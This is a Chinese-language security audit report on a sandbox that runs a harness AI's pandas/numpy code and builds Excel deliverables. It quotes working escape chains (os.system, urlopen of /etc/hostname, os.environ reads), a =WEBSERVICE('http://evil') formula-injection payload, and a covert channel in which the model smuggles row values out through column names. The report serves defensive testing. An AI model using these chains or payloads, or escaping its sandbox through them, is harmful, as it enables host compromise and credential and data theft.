# 安全漏洞扫描报告(2026-08-28,颗粒级)

> **第三轮修订(2026-08-28,ADR-0009 出域单点)**:用户终裁"任何一层都不
> 限制 harness AI 的代码执行面,唯一红线=数据行值出域"。据此 **§一 V-1 的
> AST/GuardedModule 执行面防线与 §五 FP-1/2/3 的白名单机制整体退役**
> (R-1 宿主破坏面/R-2 stdout 行值/R-3 网络出域显式接受,登记于
> ADR-0009 §风险登记);**V-2/V-3 与 §五 的 V-4/6/7a/8 闭合全部保留**。
> V-1 形态已入库 commit 61dc8a9,可随时 revert。详见
> adr/0009-egress-only-execution-freedom.md。

方法:静态逐行细读 + **实战探针**(攻击 PoC 在沙箱/管线真实执行复现后再定性,修复后同探针复验)。范围:四企业插件全部源码(TS/Python)、worker 协议、Excel 交付管线、设置 API、归档解压、通用车道护栏。

---

## 一、已确认并修复

### V-1【P0·沙箱逃逸→任意命令执行】AST 黑名单可被"逐属性合法"的下钻链绕过
**复现**(修复前全部 ok=True):`pd.io.common.os.system('echo PWNED > /tmp/pwned.txt')`(命令真实执行)、`pd.io.common.urlopen('file:///etc/hostname')`(项目根外任意读)、`pd.io.common.get_handle(...)`(任意读)、`np.lib.npyio.DataSource().open(...).read()`(numpy2 新路径任意读)、`pd.io.common.os.environ`(摸宿主全部环境变量)。
**根因**:AST 只按单属性名匹配(read_/to_/双下划线/枚举名),`io`/`common`/`urlopen`/`read`/`system` 单看每个都合法;pd/np 的内部子模块树(pandas.io.common 直接挂着 os/urlopen)是公共逃逸入口。
**修复**(sandbox.py):新增 **GuardedModule 运行时护栏**包装 pd/np——①双下划线属性拒绝;②read_/to_ 前缀与 IO 名单(get_handle/urlopen/DataSource/ExcelWriter/ExcelFile/HDFStore/SAS7BDAT/loadtxt/... )拒绝;③**一切 module 类型的属性一律拒绝**(子模块树整体封死,顶层 API 零损耗)。__slots__+object.__setattr__ 防改写包装器。
**复验**:六条攻击链全灭;合法面 DataFrame/merge/groupby/isinstance/np.sqrt/df.sample 探针 4+2 全过。

### V-2【P1·交付物公式注入】'=' 开头的模型串被 openpyxl 当公式;sheet 名引号可逃逸 HYPERLINK
**复现**:`ws.cell(1,1,"=1+1")` → data_type='f';数据值 `=WEBSERVICE("http://evil")` 会活在未来交付给 DM 的 Excel 里(DM 打开即触发外联);outputs 键名含 `"` 可打破 Content 页 HYPERLINK 字符串注入公式体。
**修复**(templates/build_workbook):新增 `literal_cell()`——模型/数据可控的九处写入点全部字面量化(' 开头强制 data_type='s');`hyperlink_formula()` 对表名引号双写转义;Content 跳转与业务页返回链接两个**设计内**公式由测试精确断言钉死。新增 test_formula_neutralization.py 三用例。

### V-3【P1·凭据暴露面】worker 继承宿主全部环境变量
spawn 用 `{...process.env}` 把宿主环境(可能含 API key/令牌)整份递给 Python 子进程;配合 V-1 的 os.environ 可读即构成完整凭据收割链。
**修复**(worker.ts):`minimalSpawnEnv()` 白名单——win32 只留 PATH/SYSTEMROOT/SYSTEMDRIVE/COMSPEC/PATHEXT/WINDIR/TEMP/TMP/APPDATA/LOCALAPPDATA/USERPROFILE,类 Unix 只留 PATH/LANG/LC_ALL/TMPDIR/HOME,外加强制 PYTHONUTF8/PYTHONIOENCODING。

---

## 二、已确认·接受/记录在案(未改代码)

| # | 级别 | 发现 | 处置 |
|---|---|---|---|
| V-4 | P2 | **元数据隐蔽信道**:模型可把输出列名 rename 成数据值,经 run_code 回执的 columns 名单带出行值(威胁模型=非对抗 AI;属 ADR-0007"不做内容判定"代价) | 记录;若未来收紧可对列名做长度/字符集机械上限(非内容判定) |
| V-5 | P2 | **护栏正则残余**:通配符(`cat *.csv`)与先写辅助脚本再执行等间接形态不匹配(**勘误 2026-08-28 深夜:带空格文件名其实命中**——token 逐段匹配,`"my data.csv"` 中的 `data.csv` 照样被抓,已入 FP 测试钉死) | ADR-0007 §残留风险已载;通配符刻意不拦(`ls *.csv` 会误伤);系统提示纪律兜底 |
| V-6 | P2 | **设置 API 无鉴权**:无 Origin 头时 sameOrigin=true,本机任意进程可 POST 翻转数据开关 | 部署域威胁(localhost);未来可加 loopback 绑定校验/一次性 token |
| V-7 | P3 | **健壮性**:run_code 无进程内墙钟(TS 900s kill 为粗粒度,CPU 空转/OOM 可先发生);StringIO 在截断前无界增长;list_files stat() 竞态可致整单失败 | 记录待优化 |
| V-8 | P3 | **设计内公式通道**:`_layout.back_link.formula` 是模型自写公式(文档化定制口) | DM 审核是控制点;如需收紧可白名单 HYPERLINK 形态 |
| V-9 | 记录 | **能力折损**(V-1 修复副作用):np.random/pd.errors 等子模块被整体封;`df.sample()` 等方法面仍可用 | 可接受;若实战抱怨再按子模块粒度放行 |

---

## 三、检查过·确认无问题

zip-slip(`_safe_members` resolve+relative_to,zipfile 不还原 symlink 成员,双重成立);settings-page 全 textContent 无 XSS;branding 值转义+jsonForScript `<` 失活;publish 的 scenario 先过 SUPPORTED_SCENARIOS 再落盘(路径穿越不可达);NDJSON 协议行 16MB 上限;审计 JSONL 无数据值;护栏 deny 理由只含路径引用。

---

## 四、验证

pytest **153** 全绿(新增:六条逃逸链回归 + 护栏零损耗 + 公式中和三用例);listing tsc -b 零错误;全部攻击探针修复后复验全灭(见 §一)。ADR-0008 为本批决策记录。

**Windows 侧待办不变**:check:all 收口、杂物删除、start.bat 端到端、git commit(本批改动:sandbox.py、excel/templates.py、excel/build_workbook.py、worker.ts、新增两个测试文件、ADR-0008、本报告、CHANGELOG)。


---

## 五、第二轮修复记录(2026-08-28 深夜,用户指令"全部修复且不误伤")

### 防变蠢(FP)修复——比漏洞修复更重要的一半

| # | 误伤面 | 处置 |
|---|---|---|
| FP-1 | **`to_*` 前缀一刀切误杀纯转换函数**:`pd.to_datetime/to_numeric/to_list/to_numpy/to_dict/to_string` 全被拦——正常清洗工作流直接断路 | 读取器保留 `read_` 前缀阻断(read_* 无合法需求);写出器改**枚举名单**(to_csv/to_excel/to_pickle 等 18 个,零漏真实写出器);纯转换全放行。AST 与 GuardedModule 双层同步 |
| FP-2 | 模块封死带来的能力折损(np.random/pd.errors/无 datetime/json) | 注入 `rng`(numpy Generator 实例,采样/种子全能力)与 `datetime`/`json` 纯模块 |
| FP-3 | **`__import__` 缺失会断 numpy/pandas 内部惰性导入**:实战复现 `ndarray.sum()` 经 C 层 PyImport_Import 取当前帧 builtins 的 `__import__` 导入 `numpy._core._methods` → KeyError,合法 API 无端断路 | builtins 提供 `safe_import` **白名单安全导入器**:numpy/pandas 家族放行(返回值经 GuardedModule 把守,`import pandas.io.common as c; c.os` 仍进不去)+ 17 个纯计算标准库(re/json/datetime/statistics/collections/itertools/functools/decimal/fractions/random/operator/string/textwrap/numbers/bisect/heapq/math);os/sys 等给清晰 ImportError。**模型从此可以正常 import re/statistics 等**——能力净增,安全不降 |
| FP-4 | 护栏误伤纯写出型工具:写文档**提及**数据集文件名被拒(名字来自 inspect 元数据,非内容,拦了零收益) | dataset-guard 增加 WRITE_ONLY_TOOLS 豁免(write/edit/multiedit/apply_patch/notebookedit/write_file/create_file/str_replace/insert,大小写不敏感);读取型(shell/Read)照拦;未知名保守拦截 |

### 记录在案项的零误伤闭合

- **V-4**:回执内列名/表名显示上限 120 字符(机械上限非内容判定;真实名保留在会话与发布产物)——压缩"列名走私行值"信道带宽,零误伤
- **V-6**:设置 API POST 加 `X-DSH-Settings` 头要求(设置页 fetch 恒携带;浏览器表单/跨源页无法伪造);本地进程改配置文件本就等价可达,只收口浏览器侧
- **V-7a**:stdout/stderr 捕获流 1MB 上限(执行继续不停,回执带 truncated 标记)——防 print 海量输出打爆 worker 内存
- **V-7b**:`list_files` 的 `stat()` 竞态改为跳过(不再整单失败)
- **V-8**:back_link 公式白名单 `=HYPERLINK(` 前缀(文档化契约本身;=WEBSERVICE/=CMD 拒绝,错误信息给出正确写法)
- **V-7 墙钟**:刻意不加进程内超时——重计算合法需要分钟级,加了必误伤;TS 900s 粗粒度兜底已够

### 验证(第二轮)

pytest **160** 全绿(新增:import 白名单 4 用例/C 惰性导入回归/to_* 放行/捕获上限/back_link 白名单/回执名上限);四包 tsc 零错误;check-architecture+check-secrets 过;双面探针复验:5 条攻击链全灭(pwned 未落盘)+ 3 条合法链(to_numpy().sum()/import re+statistics/pd.to_numeric)全通。护栏 FP 套件:常规命令 5 类全放行、纯写出工具豁免、带空格文件名仍命中、读取型仍拒。

---

## 六、第三轮(2026-08-28 终裁日深夜):出域单点政策反转记录

用户终裁:"不管在哪一层,都不限制 harness AI 的代码执行面;始终限制的只有数据行值出域。"决策与风险登记见 **ADR-0009**,本节只记录扫描报告视角的变化:

- **退役(按政策,非失效)**:V-1 防线(AST 禁用表/GuardedModule/子模块封死)与 FP-1/2/3 补偿机制(枚举写出器/rng·datetime·json 注入/safe_import 白名单)。六条逃逸链回归测试随批删除,新增执行自由回归(import os/open 读写/pd.read_csv+to_csv/eval-exec)。**该形态已入库(commit 61dc8a9),随时可 revert。**
- **保留(全部与执行面无关)**:V-2 Excel 公式中和;V-3 worker 环境白名单;V-4 回执 120 字符上限;V-6 X-DSH-Settings 头;V-7a 捕获流 1MB 上限+truncated;V-7b stat 竞态跳过;V-8 back_link =HYPERLINK 白名单;FP-4 dataset-guard 纯写出工具豁免。
- **风险移交**:R-1(无限制执行的宿主破坏面)/R-2(stdout 行值)/R-3(网络出域)按非对抗威胁模型接受,登记于 ADR-0009 §风险登记。
- **验证**:pytest 143 全绿(160→143:24 条封堵用例退役、7 条自由用例新增);四包 tsc 零错误;出域投影用例零回归。
